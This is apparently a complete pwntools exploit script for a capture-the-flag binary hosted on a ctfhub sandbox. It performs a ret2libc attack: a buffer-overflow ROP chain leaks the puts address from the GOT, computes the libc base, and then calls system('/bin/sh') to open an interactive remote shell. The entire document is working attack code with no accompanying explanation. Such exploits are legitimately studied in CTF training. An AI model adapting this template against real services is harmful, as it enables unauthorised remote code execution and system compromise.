from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('challenge-aa7fdc153a68545a.sandbox.ctfhub.com', 32528)
elf = ELF('./pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_rdi = 0x400683   # pop rdi; ret
padding = cyclic(0x40+0x8)
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvline()
io.sendline(payload)
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.success('puts_addr => %#x', puts_addr)
ret = 0x40048e  # ret
libc = ELF('./libc-2.27.so')
offset = {'puts': libc.sym['puts'], 'system': libc.sym['system'], 'sh': next(libc.search(b'/bin/sh'))}
# from LibcSearcher import *
# libc = LibcSearcher('puts', puts_addr)
# offset = {'puts': libc.dump('puts'), 'system': libc.dump('system'), 'sh': libc.dump('str_bin_sh')}
# Choose: libc6_2.27-0ubuntu3_amd64
libcbase = puts_addr - offset['puts']
log.success('libcbase_addr => %#x', libcbase)
system_addr = libcbase + offset['system']
log.success('system_addr => %#x', system_addr)
bin_sh_addr = libcbase + offset['sh']
log.success('bin_sh_addr => %#x', bin_sh_addr)
shellcode = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'\n', shellcode)
io.interactive()